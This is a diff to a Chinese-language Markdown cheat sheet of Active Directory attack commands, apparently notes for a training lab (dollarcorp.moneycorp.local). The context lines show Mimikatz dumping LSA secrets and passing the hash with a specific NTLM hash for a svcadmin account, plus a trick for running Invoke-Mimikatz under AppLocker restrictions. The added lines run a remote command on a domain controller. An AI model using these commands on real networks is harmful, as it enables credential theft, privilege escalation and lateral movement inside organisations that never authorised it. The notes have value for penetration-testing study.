@@ -30,6 +30,12 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
 ```
 
+
+# 执行命令
+```
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
 # Mimikatz.ps1调用自己（适用于有Applocker策略不允许执行ps1脚本的环境）
 在Invoke-Mimikatz.ps1文件的最底部，加一行命令：Invoke-Mimikatz
 
